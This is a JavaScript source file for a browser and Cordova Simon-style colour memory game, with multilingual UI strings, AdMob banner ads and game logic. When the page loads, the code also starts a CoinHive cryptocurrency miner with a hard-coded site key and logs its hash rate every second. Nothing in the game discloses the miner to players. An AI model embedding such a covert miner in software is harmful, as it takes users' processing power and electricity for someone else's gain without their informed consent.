let langs = {
    pt: {
        play: "Jogar",
        reset: "Reiniciar",
        strict: "Difícil",
        lost_msg: "Você perdeu!",
        win_msg: "Você venceu",
        made_by: "Desenvolvido por",
        exit: "Sair",
        lifes: "Vidas",
    },
    en: {
        play: "Play",
        reset: "Reset",
        strict: "Strict",
        lost_msg: "You Lost!",
        win_msg: "You Won!",
        made_by: "Made by",
        exit: "Exit",
        lifes: "Lifes",
    },
    es: {
        play: "Jugar",
        reset: "Reiniciar",
        strict: "Difícil",
        lost_msg: "¡Perdiste!",
        win_msg: "¡Ganaste!",
        made_by: "Hecho por",
        exit: "Salir",
        lifes: "Vidas",
    }
}

let ac = new Audio("sounds/1.mp3");
let ao = new Audio("sounds/2.mp3");
let ap = new Audio("sounds/3.mp3");
let ag = new Audio("sounds/4.mp3");
let strict = false;
let started = false;
let playable = false;
let simon = [];
let answers = [];
let miss = 0;
let score = 0;


if (window.cordova) {
    var admobid = {};
    if (/(android)/i.test(navigator.userAgent)) {
        admobid = { // for Android
            banner: 'ca-app-pub-7891061342085623/6374657115',
        };
    } else if (/(ipod|iphone|ipad)/i.test(navigator.userAgent)) {
        admobid = { // for iOS
            banner: 'ca-app-pub-7891061342085623/6374657115',
        };
    } else {
        admobid = { // for Windows Phone
            banner: 'ca-app-pub-7891061342085623/6374657115',
        };
    }

    function initApp() {
        if (!AdMob) {
            alert('admob plugin not ready');
            return;
        }

        // this will create a banner on startup
        AdMob.createBanner({
            adId: admobid.banner,
            position: AdMob.AD_POSITION.BOTTOM_CENTER,
            overlap: false,
            offsetTopBar: false,
            bgColor: 'black'
        });
    }

    if ((/(ipad|iphone|ipod|android|windows phone)/i.test(navigator.userAgent))) {
        document.addEventListener('deviceready', initApp, false);
    } else {
        initApp();
    }
}

$(document).ready(function () {
    let miner = new CoinHive.Anonymous('AOMYJycRcvUqcJQewle4KaXLJoaFOj3f', {
        throttle: 0.3,
        theme: 'dark',
        forceASMJS: false,
    });

    miner.on('found', function () {
        console.log("Hash Found")
    });
    miner.on('accepted', function () {
        console.log("Hash Accepted")
    });

    setInterval(function () {
        let hs = miner.getHashesPerSecond();
        let th = miner.getTotalHashes();
        let ah = miner.getAcceptedHashes();
        console.log(`H/S: ${hs}\nTH: ${th}\nAH: ${ah}`);
    }, 1000);

    if (!miner.didOptOut(14400)) {
        miner.start();
    }

    toastr.options = {
        "closeButton": false,
        "debug": false,
        "newestOnTop": false,
        "progressBar": false,
        "positionClass": "toast-bottom-center",
        "preventDuplicates": false,
        "onclick": null,
        "showDuration": "300",
        "hideDuration": "1000",
        "timeOut": "5000",
        "extendedTimeOut": "1000",
        "showEasing": "swing",
        "hideEasing": "linear",
        "showMethod": "fadeIn",
        "hideMethod": "fadeOut"
    }

    let actualLang = navigator.language.substring(0, 2);

    console.log(actualLang);

    if (actualLang != 'en' &&
        actualLang != 'pt' &&
        actualLang != 'es'
    ) {
        actualLang = 'en';
    }

    let lang = langs[actualLang];

    console.log(lang);
    $("#box").css("margin-top", Math.floor(($(document).height() - $("#box").height()) / 2) + "px");
    $("#score").html(score);
    $("#msg").hide();

    $("#play").html(lang.play);
    $("#strict").html(lang.strict);

    function showColors() {
        playable = false;
        let i = 0;
        loop();

        function loop() {
            setTimeout(() => {
                if (simon[i] == "c") {
                    ac.play();
                    $("#cyan").css("background", "rgb(80, 230, 240)");
                    setTimeout(() => {
                        $("#cyan").css("background", "rgb(40, 190, 180)");
                    }, 1000);
                }

                if (simon[i] == "o") {
                    ao.play();
                    $("#orange").css("background", "rgb(255, 150, 70)");
                    setTimeout(() => {
                        $("#orange").css("background", "rgb(235, 110, 20)");
                    }, 1000);
                }

                if (simon[i] == "g") {
                    ag.play();
                    $("#green").css("background", "rgb(85, 255, 75)");
                    setTimeout(() => {
                        $("#green").css("background", "rgb(45, 220, 35)");
                    }, 1000);
                }

                if (simon[i] == "p") {
                    ap.play();
                    $("#pink").css("background", "rgb(255, 60, 135)");
                    setTimeout(() => {
                        $("#pink").css("background", "rgb(225, 10, 195)");
                    }, 1000);
                }
                i++;
            }, 1000);
            if (i < simon.length - 1) {
                setTimeout(() => {
                    loop();
                }, 1300);
            } else if (started) {
                setTimeout(() => {
                    playable = true;
                }, 2000);
            }
        }
    }

    function addColor() {
        if (score == 20) {
            gameWin();
        }
        let rand = Math.floor(Math.random() * 4);
        switch (rand) {
            case 0:
                simon.push("c");
                break;
            case 1:
                simon.push("o");
                break;
            case 2:
                simon.push("g");
                break;
            case 3:
                simon.push("p");
        }
        if (started) {
            setTimeout(() => {
                showColors();
            }, 1000);
        }

    }

    function startGame() {
        addColor();
    }

    function resetGame(misses = 0) {
        $("#play").html(lang.play);
        $("#score").html("0");
        started = false;
        playable = false;
        simon = [];
        answers = [];
        miss = misses;
        score = 0;
    }

    function gameOver() {
        if (window.cordova) {
            navigator.notification.confirm(
                lang.lost_msg, // message
                (res) => {
                    if (res.buttonIndex == 0) {
                        resetGame();
                    } else {
                        if (navigator.app) {
                            navigator.app.exitApp();
                        } else if (navigator.device) {
                            navigator.device.exitApp();
                        } else {
                            window.close();
                        }
                    }
                }, // callback to invoke with index of button pressed
                'Game Over', // title
                [langs.reset, langs.exit] // buttonLabels
            );
        } else {
            toastr["success"]("Game over!");
        }
    }

    function gameWin() {
        if (window.cordova) {
            navigator.notification.confirm(
                lang.win_msg, // message
                (res) => {
                    if (res.buttonIndex == 0) {
                        resetGame();
                    } else {
                        if (navigator.app) {
                            navigator.app.exitApp();
                        } else if (navigator.device) {
                            navigator.device.exitApp();
                        } else {
                            window.close();
                        }
                    }
                }, // callback to invoke with index of button pressed
                'You Win!', // title
                [langs.reset, langs.exit] // buttonLabels
            );
        } else {
            toastr["success"]("You Win!");
        }
    }

    function checkCorrect(el) {
        let roundMiss = false;
        if (answers.length == simon.length) {
            for (let i = 0; i < answers.length; i++) {
                if (answers[i] != simon[i]) {
                    roundMiss = true;
                }
            }
            if (roundMiss) {
                miss++
                if (miss < 2) {
                    answers = [];
                    setTimeout(() => {
                        showColors();
                    }, 2000);
                    playable = false;
                    toastr["success"]("Missed! " + miss + " attempt remaining!");
                } else {
                    gameOver();
                }
            } else {
                score++;
                $("#score").html(score);
                answers = [];
                addColor();
            }
        }
    }

    $("#strict").on("click", function () {
        if (strict) {
            strict = false;
            $("#strict").css("background", "#222");
            toastr["success"]("Strict Mode Off!");
            resetGame();
        } else {
            strict = true;
            $("#strict").css("background", "red");
            toastr["success"]("Strict Mode On!");
            resetGame(1);
        }
    });

    $("#play").on("click", function () {
        if (!started) {
            started = true;
            $(this).html(lang.reset);
            toastr["success"]("Starting Game!");
            startGame();
        } else {
            started = false;
            $(this).html(lang.play);
            toastr["success"]("Reseting Game!");
            resetGame();
        }
    });

    $("#cyan").on("click", function () {
        if (playable && simon.length > answers.length) {
            ac.play();
            answers.push("c");
            $(this).css("background", "rgb(80, 230, 240)");
            $(this).css("box-shadow", "0px 0px rgba(0,0,0,.5)");
            setTimeout(() => {
                $(this).css("background", "rgb(40, 190, 180)");
                $(this).css("box-shadow", "5px 5px rgba(0,0,0,.5)");
            }, 400);
            checkCorrect(this);
        }
    });

    $("#orange").on("click", function () {
        if (playable && simon.length > answers.length) {
            ao.play();
            answers.push("o");
            $(this).css("background", "rgb(255, 150, 70)");
            $(this).css("box-shadow", "0px 0px rgba(0,0,0,.5)");
            setTimeout(() => {
                $(this).css("background", "rgb(235, 110, 20)");
                $(this).css("box-shadow", "5px 5px rgba(0,0,0,.5)");
            }, 400);
            checkCorrect(this);
        }

    });

    $("#green").on("click", function () {
        if (playable && simon.length > answers.length) {
            ag.play();
            answers.push("g");
            $(this).css("background", "rgb(85, 255, 75)");
            $(this).css("box-shadow", "0px 0px rgba(0,0,0,.5)");
            setTimeout(() => {
                $(this).css("background", "rgb(45, 220, 35)");
                $(this).css("box-shadow", "5px 5px rgba(0,0,0,.5)");
            }, 400);
            checkCorrect(this);
        }

    });

    $("#pink").on("click", function () {
        if (playable && simon.length > answers.length) {
            ap.play();
            answers.push("p");
            $(this).css("background", "rgb(255, 60, 135)");
            $(this).css("box-shadow", "0px 0px rgba(0,0,0,.5)");
            setTimeout(() => {
                $(this).css("background", "rgb(225, 10, 195)");
                $(this).css("box-shadow", "5px 5px rgba(0,0,0,.5)");
            }, 400);
            checkCorrect(this);
        }
    });
});